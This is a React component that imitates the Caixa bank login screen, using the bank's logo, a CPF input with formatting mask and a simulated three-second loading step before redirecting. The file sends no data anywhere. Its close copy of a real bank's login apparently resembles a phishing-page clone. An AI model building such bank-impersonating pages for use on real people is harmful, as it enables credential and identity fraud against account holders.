import { useState } from "react";
import { useNavigate } from "react-router-dom"; // useNavigate é necessário para o redirecionamento
import logo from "../assets/caixa.webp";
import user from "../assets/user.png";

export function Login() {
    const [cpf, setCpf] = useState("");
    const [isLoading, setIsLoading] = useState(false); // Estado para o carregamento
    const navigate = useNavigate(); // Hook para redirecionar

    // Função para aplicar a máscara de CPF
    const handleCpfChange = (event: React.ChangeEvent<HTMLInputElement>) => {
        let value = event.target.value.replace(/\D/g, ""); // Remove caracteres não numéricos
        if (value.length > 11) value = value.slice(0, 11); // Limita o número de dígitos a 11

        // Formata o valor no padrão CPF
        value = value.replace(/(\d{3})(\d)/, "$1.$2");
        value = value.replace(/(\d{3})(\d)/, "$1.$2");
        value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");

        setCpf(value);
    };

    // Função para iniciar o carregamento e redirecionar
    const handleNext = () => {
        setIsLoading(true); // Inicia o carregamento
        setTimeout(() => {
            setIsLoading(false); // Termina o carregamento após 3 segundos
            navigate("/carregando"); // Redireciona para a nova página
        }, 3000); // Define o tempo de carregamento
    };

    return (
        <div className="w-screen px-6 space-y-6 mt-6">
            <header className="flex flex-col justify-center items-center p-4 space-y-3">
                <img width={170} src={logo} alt="logo" />
                <span className="text-blue-800">Login Caixa</span>
            </header>

            <div>
                <h1 className="text-lg text-zinc-500">Informe seu CPF e clique em "Próximo" para continuar:</h1>
            </div>

            <div className="flex items-center space-x-2">
                <img src={user} alt="user" width={15} />
                <input
                    type="text"
                    value={cpf}
                    onChange={handleCpfChange}
                    className="border-b border-b-orange-500 w-full text-lg outline-none"
                    placeholder="CPF"
                    maxLength={14} // Limita o número de caracteres
                />
            </div>

            <button
                onClick={handleNext}
                className={`w-full text-white rounded-sm flex items-center justify-center h-10 ${isLoading ? "bg-orange-500 cursor-not-allowed" : "bg-orange-400"
                    }`}
                disabled={isLoading} // Desativa o botão durante o carregamento
            >
                {isLoading ? (
                    <div className="animate-spin rounded-full h-5 w-5 border-t-2 border-white"></div> // Spinner
                ) : (
                    "Próximo"
                )}
            </button>

            <div className="flex flex-col items-center text-blue-900 space-y-6">
                <div className="font-semibold">
                    É novo por aqui? <span className="underline">Cadastre-se</span>
                </div>
                <span className="underline">Preciso de ajuda</span>
            </div>
        </div>
    );
}
